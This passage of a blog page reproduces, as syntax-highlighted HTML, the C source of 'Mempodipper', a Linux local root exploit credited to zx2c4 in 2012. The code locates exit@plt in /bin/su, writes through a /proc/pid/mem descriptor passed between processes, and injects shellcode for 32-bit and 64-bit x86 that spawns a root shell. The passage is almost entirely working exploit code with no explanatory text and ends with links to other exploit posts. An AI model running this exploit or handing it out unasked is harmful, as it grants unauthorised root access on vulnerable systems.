    </span><span style="color:#82aaff;">close</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">]);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">dup2</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">], </span><span style="color:#f78c6c;">2</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">execl</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/bin/su</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">su</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">not-a-valid-user</span><span style="color:#89ddff;">&quot;, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">unsigned long </span><span style="color:#82aaff;">objdump_address</span><span style="color:#89ddff;">()</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  FILE </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">command </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">popen</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">objdump -d /bin/su|grep &#39;&lt;exit@plt&gt;&#39;|head -n 1|cut -d &#39; &#39; -f 1|sed &#39;s/^[0]*</span><span style="color:#89ddff;">\\</span><span style="color:#c3e88d;">([^0]*</span><span style="color:#89ddff;">\\</span><span style="color:#c3e88d;">)/0x</span><span style="color:#89ddff;">\\</span><span style="color:#c3e88d;">1/&#39;</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">command</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] popen</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> result</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">32</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">fgets</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">result</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">32</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> command</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">pclose</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">command</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#82aaff;">strtoul</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">result</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">16</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">unsigned long </span><span style="color:#82aaff;">find_address</span><span style="color:#89ddff;">()</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Ptracing su to find next instruction without reading binary.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> address </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">ptrace_address</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">address</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] Ptrace failed.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Reading su binary with objdump to find exit@plt.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    address </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">objdump_address</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">address </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> ULONG_MAX </span><span style="color:#89ddff;">|| !</span><span style="color:#eeffff;">address</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] Could not resolve /bin/su. Specify the exit@plt function address manually.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] Usage: </span><span style="color:#eeffff;">%s</span><span style="color:#c3e88d;"> -o ADDRESS</span><span style="color:#89ddff;">\n</span><span style="color:#c3e88d;">[-] Example: </span><span style="color:#eeffff;">%s</span><span style="color:#c3e88d;"> -o 0x402178</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> prog_name</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> prog_name</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Resolved call address to 0x</span><span style="color:#eeffff;">%lx</span><span style="color:#c3e88d;">.</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> address</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return</span><span style="color:#eeffff;"> address</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">su_padding</span><span style="color:#89ddff;">()</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Calculating su padding.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  FILE </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">command </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">popen</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/bin/su this-user-does-not-exist 2&gt;&amp;1</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">command</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] popen</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> result</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">256</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">fgets</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">result</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">256</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> command</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">pclose</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">command</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#82aaff;">strstr</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">result</span><span style="color:#89ddff;">, &quot;</span><span style="color:#c3e88d;">this-user-does-not-exist</span><span style="color:#89ddff;">&quot;) -</span><span style="color:#eeffff;"> result</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">child</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">sock</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> parent_mem</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">256</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">sprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">parent_mem</span><span style="color:#89ddff;">, &quot;</span><span style="color:#c3e88d;">/proc/</span><span style="color:#eeffff;">%d</span><span style="color:#c3e88d;">/mem</span><span style="color:#89ddff;">&quot;, </span><span style="color:#82aaff;">getppid</span><span style="color:#89ddff;">());</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Opening parent mem </span><span style="color:#eeffff;">%s</span><span style="color:#c3e88d;"> in child.</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> parent_mem</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> fd </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">open</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">parent_mem</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> O_RDWR</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">fd </span><span style="color:#89ddff;">&lt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] open</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Sending fd </span><span style="color:#eeffff;">%d</span><span style="color:#c3e88d;"> to parent.</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> fd</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">send_fd</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sock</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> fd</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">parent</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">unsigned long </span><span style="color:#f78c6c;">address</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> sockets</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">2</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Opening socketpair.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">socketpair</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">AF_UNIX</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> SOCK_STREAM</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> sockets</span><span style="color:#89ddff;">) &lt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] socketpair</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fork</span><span style="color:#89ddff;">()) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Waiting for transferred fd in parent.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> fd </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">recv_fd</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sockets</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">]);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Received fd at </span><span style="color:#eeffff;">%d</span><span style="color:#c3e88d;">.</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> fd</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">fd </span><span style="color:#89ddff;">&lt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] recv_fd</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Assigning fd </span><span style="color:#eeffff;">%d</span><span style="color:#c3e88d;"> to stderr.</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> fd</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">dup2</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">2</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">15</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">dup2</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">2</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> offset </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> address </span><span style="color:#89ddff;">- </span><span style="color:#82aaff;">su_padding</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Seeking to offset 0x</span><span style="color:#eeffff;">%lx</span><span style="color:#c3e88d;">.</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> offset</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">lseek64</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> offset</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> SEEK_SET</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#if defined</span><span style="color:#eeffff;">(__i386__)</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#4a4a4a;">// See shellcode-32.s in this package for the source.</span><span style="font-style:italic;color:#4a4a4a;">
    </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> shellcode</span><span style="color:#89ddff;">[] =</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x0f\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x80&quot;;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#elif defined</span><span style="color:#eeffff;">(__x86_64__)</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#4a4a4a;">// See shellcode-64.s in this package for the source.</span><span style="font-style:italic;color:#4a4a4a;">
    </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> shellcode</span><span style="color:#89ddff;">[] =</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x48&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x31\xf6\x40\xb7\x0f\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x48\x31\xdb\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50&quot;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">&quot;\x51\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05&quot;;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#else</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#error </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">That platform is not supported.</span><span style="color:#89ddff;">&quot;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#endif</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Executing su with shellcode.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">execl</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/bin/su</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">su</span><span style="color:#89ddff;">&quot;,</span><span style="color:#82aaff;"> shellcode</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> sock</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">32</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">sprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sock</span><span style="color:#89ddff;">, &quot;</span><span style="color:#eeffff;">%d</span><span style="color:#89ddff;">&quot;,</span><span style="color:#82aaff;"> sockets</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">]);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Executing child from child fork.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">execl</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/proc/self/exe</span><span style="color:#89ddff;">&quot;,</span><span style="color:#82aaff;"> prog_name</span><span style="color:#89ddff;">, &quot;</span><span style="color:#c3e88d;">-c</span><span style="color:#89ddff;">&quot;,</span><span style="color:#82aaff;"> sock</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">main</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">argc</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">**</span><span style="color:#f78c6c;">argv</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  prog_name </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> argv</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">argc </span><span style="color:#89ddff;">&gt; </span><span style="color:#f78c6c;">2 </span><span style="color:#89ddff;">&amp;&amp;</span><span style="color:#eeffff;"> argv</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">][</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">] == &#39;</span><span style="color:#c3e88d;">-</span><span style="color:#89ddff;">&#39; &amp;&amp;</span><span style="color:#eeffff;"> argv</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">][</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">] == &#39;</span><span style="color:#c3e88d;">c</span><span style="color:#89ddff;">&#39;)</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#82aaff;">child</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">atoi</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">argv</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">2</span><span style="color:#89ddff;">]));</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">===============================</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">=      Mempodipper    =</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">=       by zx2c4      =</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">=     Jan 21, 2012    =</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">===============================</span><span style="color:#89ddff;">\n\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">argc </span><span style="color:#89ddff;">&gt; </span><span style="color:#f78c6c;">2 </span><span style="color:#89ddff;">&amp;&amp;</span><span style="color:#eeffff;"> argv</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">][</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">] == &#39;</span><span style="color:#c3e88d;">-</span><span style="color:#89ddff;">&#39; &amp;&amp;</span><span style="color:#eeffff;"> argv</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">][</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">] == &#39;</span><span style="color:#c3e88d;">o</span><span style="color:#89ddff;">&#39;)</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#82aaff;">parent</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">strtoul</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">argv</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">2</span><span style="color:#89ddff;">], </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">16</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">else</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#82aaff;">parent</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">find_address</span><span style="color:#89ddff;">());</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span></code></pre>
    </div>

    
    

    <div class="post-footer">
        
            
                <div class="post-tags">
                    
                        <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
                    
                </div>
            
            
                <div class="post-nav">
                    
                        <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;nfzm-1999&#x2F;">‹ 阳光打在你脸上</a>
                    
                    
                        <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;local-exploit-cve2010-3848-3850&#x2F;">CVE-2010-3848 &amp; CVE-2010-3850 ›</a>
                    
                    
                    
                </div>
            

        

    </div>

    
    
</article>


                </div>
            </main>

            
            
        </div>

      
          <script type="text/javascript" src="https:&#x2F;&#x2F;xjump.me&#x2F;even.js" ></script>
      
    </body>

</html>
